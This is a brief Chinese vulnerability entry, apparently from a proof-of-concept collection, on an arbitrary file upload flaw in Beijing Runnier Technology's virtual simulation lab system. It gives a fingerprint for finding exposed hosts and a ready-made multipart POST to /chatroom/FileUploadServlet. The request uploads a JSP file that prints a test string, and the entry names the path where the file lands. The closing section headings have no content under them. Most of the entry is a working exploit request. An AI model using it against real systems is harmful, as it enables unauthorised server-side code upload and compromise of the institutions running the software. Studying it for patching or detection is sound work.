# 北京润尼尔科技股份有限公司虚拟仿真实验室系统FileUploadServlet存在任意文件上传漏洞

- **系统**：北京润尼尔科技股份有限公司虚拟仿真实验室系统　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="virexp/s"`
- **请求**：`POST /chatroom/FileUploadServlet HTTP/1.1`
- **关键头**：`Cookie: JSESSIONID=D608C8AF5AC63FB5DA57B858CFC42B42`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryGIc4ig8R`　`Content-Length: 153`

**请求体 / payload**
```
------WebKitFormBoundaryGIc4ig8R
Content-Disposition: form-data; name="aaa"; filename="1234.jsp"
<% out.println("testqqww"); %>
------WebKitFormBoundaryGIc4ig8R--

上传文件位置
/chatroom/uploadFile/1234.jsp
```

**其他**
- 北京润尼尔科技股份有限公司虚拟仿真实验室系统FileUploadServlet存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 北京润尼尔科技股份有限公司虚拟仿真实验室系统